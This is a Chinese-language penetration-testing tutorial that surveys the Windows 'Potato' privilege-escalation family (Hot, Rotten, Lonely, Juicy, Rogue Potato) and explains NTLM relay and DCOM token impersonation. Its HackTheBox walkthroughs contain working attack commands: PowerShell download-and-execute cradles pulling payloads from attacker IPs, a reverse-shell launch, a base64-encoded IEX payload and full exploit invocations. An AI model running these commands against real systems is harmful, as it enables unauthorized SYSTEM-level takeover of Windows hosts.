前言
--

当我们拿到webshell 却苦于无法提权

早之前有巴西烤肉提权，有pr提权

今天 来一个土豆提权合集

妈妈再也不担心我的webshell无法提权了

Hot Potato
----------

### 前言

利用 Windows 中的已知问题在默认配置中获得本地权限提升

即 NTLM 中继(特别是 HTTP-&gt;SMB 中继)和 NBNS 欺骗

攻击者可以在安装了Windows操作系统的工作站中将自己的低权限提升至`NT AUTHORITY\SYSTEM`

### 影响范围

Windows 7、8、10、Server 2008 和 Server 2012

为了更深入地了解这种技术，建议研究人员发布/视频：

- <https://foxglovesecurity.com/2016/01/16/hot-potato/>
- [https://www.youtube.com/watch?v=8Wjs\_\_mWOKI](https://www.youtube.com/watch?v=8Wjs__mWOKI)

### 原理详解

主要分为3步

#### 1.本地NBNS欺骗

NBNS 是 Windows 环境中常用的名称解析广播 UDP 协议。当我们(或 Windows)执行 DNS 查找时，Windows 首先会检查`hosts`文件

host文件默认位置：

```php
C:\Windows\System32\drivers\etc
```

如果不存在，它将尝试进行 DNS 查找

如果DNS 查找失败，将执行 NBNS 查找

NBNS 协议基本上只是询问本地广播域上的所有主机`谁知道主机 XXX 的 IP 地址？`

这个时候，网络上的任何主机都可以随意响应。

在渗透测试中，我们经常嗅探网络流量并响应在本地网络上观察到的 NBNS 查询。我们将模拟所有主机，用我们的 IP 地址回复每个请求，希望由此产生的连接能做一些有趣的事情，比如尝试进行身份验证。

但是出于权限提升的目的，我们不能假设我们能够嗅探网络流量。**因为这需要本地管理员访问**。那么我们如何才能完成NBNS欺骗呢？

如果我们可以提前知道目标机器（在这种情况下，我们的目标是 127.0.0.1）将发送 NBNS 查询的主机名，我们就可以制作一个假响应并用 NBNS 响应非常快速地淹没目标主机（因为它是 UDP 协议）。一个复杂的问题是 NBNS 数据包中的一个 2 字节字段，TXID，必须在请求和响应中匹配，我们无法看到请求。我们可以通过快速访问所有 65536 个可能值来应对这个问题。

如果我们的目标网络有我们想要欺骗的主机的 DNS 记录怎么办？我们可以使用一种称为 **UDP 端口耗尽的技术**来强制系统上的所有 DNS 查找失败。我们所做的就是绑定到每个 UDP 端口。这会导致 DNS 失败，因为请求将没有可用的 UDP 源端口。当 DNS 失败时，NBNS 将成为后备。

#### 2. 虚假的WPAD代理服务器

在 Windows 中，Internet Explorer 默认会通过访问 URL：<http://wpad/wpad.dat>

自动尝试检测网络代理设置配置

它既然适用于某些 Windows 服务！例如 Windows 更新，但具体如何以及在什么条件下似乎取决于版本。

当然是访问 URL：[http://wpad/wpad.dat不会存在于所有网络上，因为主机名`wpad`不一定存在于](http://wpad/wpad.dat%E4%B8%8D%E4%BC%9A%E5%AD%98%E5%9C%A8%E4%BA%8E%E6%89%80%E6%9C%89%E7%BD%91%E7%BB%9C%E4%B8%8A%EF%BC%8C%E5%9B%A0%E4%B8%BA%E4%B8%BB%E6%9C%BA%E5%90%8D%60wpad%60%E4%B8%8D%E4%B8%80%E5%AE%9A%E5%AD%98%E5%9C%A8%E4%BA%8E) DNS 名称服务器中

那么，虚假的WPAD代理服务器和本地NBNS欺骗相结合，我们可以使用 本地NBNS 欺骗来欺骗主机名

凭借欺骗 NBNS 响应的能力，我们可以将 NBNS 欺骗器定位在 127.0.0.1

我们用主机`WPAD`或`WPAD.DOMAIN.TLD`的NBNS响应数据包淹没目标机器(我们自己的机器)

WPAD主机的IP地址为127.0.0.1

同时，我们在 127.0.0.1 本地运行一个 HTTP 服务器。当它收到对URL：[http://wpad/wpad.dat的请求时，它会响应如下内容](http://wpad/wpad.dat%E7%9A%84%E8%AF%B7%E6%B1%82%E6%97%B6%EF%BC%8C%E5%AE%83%E4%BC%9A%E5%93%8D%E5%BA%94%E5%A6%82%E4%B8%8B%E5%86%85%E5%AE%B9)：

```php
FindProxyForURL(url,host){
if (dnsDomainIs(host, "localhost")) return "DIRECT";
return "PROXY 127.0.0.1:80";}
```

这将导致目标上的所有 HTTP 流量都通过我们在 127.0.0.1 上运行的服务器重定向

注：即使是由低权限用户执行的这种攻击也会影响机器的所有用户，这包括管理员和系统帐户

#### 3.HTTP -&gt; SMB NTLM 中继

NTLM 中继是一种众所周知但经常被误解的针对 Windows NTLM 身份验证的攻击。NTLM 协议容易受到中间人攻击。如果攻击者可以欺骗用户尝试使用 NTLM 对其机器进行身份验证，他可以将该身份验证尝试中继到另一台机器！

此攻击的旧版本让受害者尝试使用带有 NTLM 身份验证的 SMB 协议向攻击者进行身份验证。然后，攻击者会将这些凭据中继回受害者的计算机，并使用类似"psexec”的技术获得远程访问权限。

微软通过使用已经在进行中的challenge来禁止相同协议的 NTLM 身份验证来修补这个问题

这意味着从一台主机到其自身的 SMB-&gt;SMB NTLM 中继将不再起作用

但是，跨协议攻击，像HTTP-&gt;SMB 仍然可以正常工作

现在所有 HTTP 流量都可能流经我们控制的 HTTP 服务器，我们可以做一些事情，比如将它们重定向到某个将请求 NTLM 身份验证的地方。

在Hot Potato漏洞利用中，所有 HTTP 请求都通过 302 重定向重定向到URL：<http://localhost/GETHASHESxxxxx>

其中 xxxxx 是某个唯一标识符。请求URL：<http://localhost/GETHASHESxxxxx> 以 NTLM 身份验证的 401 请求响应。

然后将任何 NTLM 凭据中继到本地 SMB 侦听器以创建运行用户定义命令的新系统服务。

当有问题的 HTTP 请求来自高权限帐户时，例如，当它是来自 Windows 更新服务的请求时，此命令将以`NT AUTHORITY\SYSTEM`权限运行，从而完成了提权！

### 原理概述

![image-20211022212051876](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-68da9d1b8b8c0816d5084adbd63ef5311d38a3b4.png)

```php
1.本地NBNS Spoofer：冒充名称解析，强制系统下载恶意WAPD配置

2.伪造WPAD代理服务器：部署malicios WAPD配置，强制系统进行NTLM认证

3.HTTP -> SMB NTLM 中继：将 WAPD NTLM 令牌中继到 SMB 服务以创建提升的进程
```

### 实操

<https://github.com/foxglovesec/Potato>

#### Windows 7

通过Windows Defender更新机制可以相当可靠地利用 Windows 7

执行命令：

```php
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true
```

注：这将启动 NBNS 欺骗程序，将`WPAD`欺骗到 127.0.0.1，然后检查 Windows Defender 更新

如果我们的网络已经有`WPAD`的 DNS 条目，参数使用：`-disable_exhaust false`

#### Windows Server 2008

由于 Windows Server 不附带 Defender，所以需要另一种方法

我们可以简单地检查 Windows 更新

执行命令：

```php
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true -spoof_host WPAD.EMC.LOCAL
```

成功运行后，只需检查 Windows 更新。如果没有触发，请等待漏洞利用运行约 30m 并再次检查。如果它仍然不起作用，请尝试实际下载更新。

如果我们的网络已经有`WPAD`的 DNS 条目，参数使用：`-disable_exhaust false`，但它可能会执行不起来

因为执行`DNS端口耗尽`会导致所有 DNS 查找失败

在联系 WPAD 之前，Windows 更新过程可能需要进行一些 DNS 查找

在这种情况下，我们必须正确确定时间，才能使其正常工作

#### Windows 8/10/Server 2012

在Windows 8/10/Server 2012中，Windows Update 似乎不再遵守`Internet 选项`中设置的代理设置，或检查 WPAD

而是使用`netsh winhttp 代理`控制 Windows 更新的代理设置

依赖 Windows 的一个新功能-&gt;`不受信任证书的自动更新程序`

具体可以参考这里：<https://support.microsoft.com/en-us/kb/2677070>

简单来说，就是一种自动更新机制，该机制每天下载证书信任列表 (CTL)

执行命令：

```php
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
```

注：我们需要等待24 小时或找到其他方式来触发此更新。

如果我们的网络已经有`WPAD`的 DNS 条目，可以尝试端口耗尽，但是会很麻烦

### 后续

Microsoft 通过使用已经在进行中的质询来禁止相同协议的 NTLM 身份验证来修补此问题 (MS16-075)。这意味着从一台主机到其自身的 SMB-&gt;SMB NTLM 中继将不再起作用。MS16-077 WPAD 名称解析将不使用 NetBIOS (CVE-2016-3213) 并且在请求 PAC 文件时不发送凭据 (CVE-2016-3236)。WAPD MITM Attack 已修补。

Rotten Potato
-------------

<https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075>

### 影响范围

此技术不适用于 &gt;= Windows 10 1809 和 Windows Server 2019 的版本

### 优点

立即触发，而不是有时必须等待 Windows 更新

Rotten Potato相当复杂，但主要使用了 3 个东西

### 原理

```php
1.通过NT AUTHORITY/SYSTEM运行的RPC将尝试通过CoGetInstanceFromIStorage API调用向我们的本地代理进行身份验证

2.135 端口的RPC将用于回复第一个RPC正在执行的所有请求充当模板

3.AcceptSecurityContextAPI调用以在本地模拟NT AUTHORITY/SYSTEM
```

### 过程概述

![image-20211022212121001](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d521498a177634056408fa3503d1d1362d5b0ac7.png)

```php
1. 使用CoGetInstanceFromIStorage API 调用欺骗RPC,对代理进行身份验证.在此调用中指定了代理 IP/端口

2. RPC 向代理发送 NTLM 协商包

3. 代理依赖的NTLM协商到RPC在端口135，被用作模板。同时，执行对AcceptSecurityContext的调用以强制进行本地身份验证
注:此包被修改为强制本地身份验证.

4. & 5. RPC 135和AcceptSecurityContext用NTLM Challenge回复

6. 将两个数据包的内容混合以匹配本地协商并转发到RPC

7. RPC使用发送到AcceptSecurityContext(8.)的NLTM Auth包进行响应，并执行模拟(9.)
```

### 实操

<https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe>

### 总结

- DCOM 不与我们的本地侦听器交谈，因此没有 MITM 和漏洞利用。
- 将数据包发送到我们控制下侦听端口 135 的主机，然后将数据转发到我们的本地 COM 侦听器不起作用。问题是在这种情况下，客户端不会协商本地身份验证。

Lonely Potato
-------------

### 前言

Lonely Potato是Rotten Potato的改编版，不依赖meterpreter和Decoder制作的"隐身"模块。

<https://decoder.cloud/2017/12/23/the-lonely-potato/>

### 后续

Lonely Potato 已被弃用

Juicy Potato
------------

Juicy Potato允许以更灵活的方式利用该漏洞。在这种情况下，[ohpe 和解码器](http://ohpe.it/juicy-potato/)在 Windows 构建审查期间发现了一个设置，其中BITS被故意禁用并占用了端口6666，因此Rotten Potato PoC 将不起作用。

### 什么是 BITS 和 CLSID？

- CLSID是标识 COM 类对象的全局唯一标识符。它是一个类似UUID的标识符。
- 程序员和系统管理员使用后台智能传输服务 (BITS)从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到 HTTP Web 服务器和 SMB 文件共享。关键是BIT实现了IMarshal接口并允许代理声明强制 NTLM 身份验证。

Rotten Potato的 PoC 使用带有默认 CLSID 的 BITS

```php
// Use a known local system service COM server, in this cast BITSv1
Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");
```

他们发现除了 BITS 之外，还有几个进程外 COM 服务器由可能被滥用的特定 CLSID 标识。他们至少需要：

- 可由当前用户实例化，通常是具有模拟权限的服务用户
- 实现IMarshal接口
- 以提升的用户身份运行（SYSTEM、Administrator，...）

具体可以参考这里：<http://ohpe.it/juicy-potato/CLSID/>

### 优势

- 我们不需要有一个meterpreter shell
- 我们可以指定我们的 COM 服务器监听端口
- 我们可以使用 CLSID 指定滥用

### 实操

使用的环境是：HackTheBox-Jeeves

Exp下载地址：<https://github.com/ohpe/juicy-potato>

首先检查为此用户启用的系统特权

![image-20211024112732458](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3c8cabbbaedc6efad25b89ef95badca2e66c22fe.png)

烂土豆可执行文件的要求

它需要 3 个强制参数

- **-t：**创建进程调用。对于这个选项，我们将使用\*来测试这两个选项。
- **-p：**要运行的程序。我们需要创建一个文件，将反向 shell 发送回我们的攻击机器。
- **-l：** COM 服务器监听端口。这可以是任何东西。我们将使用 3333

使用powershell快速上传

```php
(new-object net.webclient).downloadfile('http://10.10.14.40:5555/1.exe', 'C:\Users\kohsuke\desktop\1.exe')
```

![image-20210822181124649](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2696f0eb62e15511c9f2da39ee3f77eefb52b1d8.png)

我们使用`Invoke-PowerShellTcp.ps1`进行反弹shell

在脚本末尾添加

```php
Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 6666
```

kali上创建一个`shell.bat`文件，该文件下载`Invoke-PowerShellTcp.ps1` PowerShell脚本并运行它

```php
powershell -c iex(new-object net.webclient).downloadstring('http://x.x.x.x:5555/Invoke-PowerShellTcp.ps1')
```

目标机器上

```php
(new-object net.webclient).downloadfile('http://10.10.14.40:5555/shell.bat', 'C:\Users\kohsuke\desktop\shell.bat')
```

然后运行可执行文件

进行尝试获取模拟 SYSTEM 的令牌，然后以提升的权限运行我们的`shell.bat`文件

```php
./1.exe -t * -p shell.bat -l 3333
```

![image-20210822181920764](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e7b76f867a1f7daeb3ed6480be620f405b78c9c9.png)

![image-20210822182132356](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b66b662b76adc18b3be0e9dda5172ac1af186a2f.png)

### 后续

与Rotten Potato一样的情况

Rogue Potato
------------

### 前言

关于Rotten/Juicy土豆 的修复后，可以得出以下结论：

```php
1.我们无法在最新的 Windows 版本中为 OXID 解析器地址指定自定义端口

2.如果我们将 OXID 解析请求重定向到我们控制下的端口 135 上的远程服务器,并将请求转发到我们的本地 Fake RPC 服务器,我们将仅获得一个匿名登录

3.如果我们将 OXID 解析请求解析到一个假的 RPC 服务器，我们将在IRemUnkown2接口查询期间获得一个标识令牌
```

### 原理

![image-20211022212202105](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1471bc927306897439aa56b2f007bb54fd96376b.png)

```php
Rogue Potato通过指定远程 IP(攻击者 IP)指示 DCOM 服务器执行远程 OXID 查询

在远程 IP 上，设置一个"socat"侦听器，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器

伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程，该过程将指向受控命名管道[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]

DCOM 服务器将连接到 RPC 服务器以执行IRemUnkown2接口调用。通过连接到命名管道，将执行"身份验证回调"，我们可以通过 RpcImpersonateClient()调用模拟调用者。

然后,令牌窃取者
  1.获取rpcss服务的PID
  2.打开进程，列出所有句柄，并为每个句柄尝试复制它并获取句柄类型
  3.如果句柄类型为"Token"且令牌所有者为 SYSTEM，则尝试使用CreatProcessAsUser()或CreateProcessWithToken()模拟并启动进程
```

### 前提

- 我们需要有一台机器在我们的控制之下，我们可以在其中执行重定向，并且受害者必须可以在端口 135上访问该机器
- 我们需要上传两个 exe 文件，当受害者的防火墙不接受传入连接时，也可以在我们控制的 Windows 机器上以独立模式启动伪造的 OXID 解析器

### 原理概述

```php
当我们运行RoguePotato.exe，我们可以让它在本地机器上启动该服务，或者我们可以在自己控制的 Windows 机器上启动它并让它到达那里

如果我想在本地机器上使用解析器，我需要在我的机器上创建一个隧道，该隧道在 TCP 135 上接收并重定向回目标主机上的解析器。
```

### 实操

Exp下载地址：<https://github.com/antonioCoco/RoguePotato>

使用的环境是：HackTheBox-Remote

开始

![image-20211102205146787](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b4cf90e552120caed27251d1c5747189939a1c62.png)

powershell下载文件

```php
powershell.exe (new-object net.webclient).downloadfile('http://10.10.14.6:8888/RoguePotato.exe', 'C:\tmp\RoguePotato.exe')

powershell.exe (new-object net.webclient).downloadfile('http://10.10.14.6:8888/RogueOxidResolver.exe', 'C:\tmp\RogueOxidResolver.exe')
```

![image-20211103170610456](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8e47422eb041d23021d69442eaf94086ecfbcd3b.png)

- `-r 10.10.14.6` - 这是识别我的主机的必需选项；
- `-l 9999` - 本地监听的端口；
- `-e xxx` - 运行命令

执行命令

```php
.\RoguePotato.exe -r 10.10.14.6 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "powershell -c iex( iwr http://10.10.14.6:8888/shell.ps1 -UseBasicParsing )" -l 9999
```

无法直接使用powershell命令直接执行上传shell提权  
需要转换为base64值

```php
echo "IEX( IWR http://10.10.14.6:8888/shell1.ps1 -UseBasicParsing)" | iconv -t utf-16le|base64 -w 0
```

```php
SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2ADoAOAA4ADgAOAAvAHMAaABlAGwAbAAxAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=
```

```php
.\RoguePotato.exe -r 10.10.14.6 -e "cmd.exe /c powershell -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2ADoAOAA4ADgAOAAvAHMAaABlAGwAbAAxAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=" -l 9999
```

它提示我

```php
[-] Named pipe didn't received any connect request
```

![image-20211103180317059](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d73c9b2664d8a14f2c9f8e48258886c98a4504f2.png)

它可能和CLSID有关系

进行查阅

<http://ohpe.it/juicy-potato/CLSID/>

![image-20211103172348801](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ac6d49c9c9e0aab30131ac99130843855d2c0344.png)

```php
UsoSvc  {E7299E79-75E5-47BB-A03D-6D319FB7F886}  {B91D5831-B1BD-4608-8198-D72E155020F7}  NT AUTHORITY\SYSTEM
```

继续

```php
.\RoguePotato.exe -r 10.10.14.6 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "cmd.exe /c powershell -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2ADoAOAA4ADgAOAAvAHMAaABlAGwAbAAxAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=" -l 9999
```

成功提权到system

总结
--

- 如果机器 &gt;= Windows 10 1809 &amp; Windows Server 2019 试试[Rogue Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato)
- 如果机器 &lt; Windows 10 1809 &lt; Windows Server 2019 试试[Juicy Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato)

希望可以帮到各位师傅！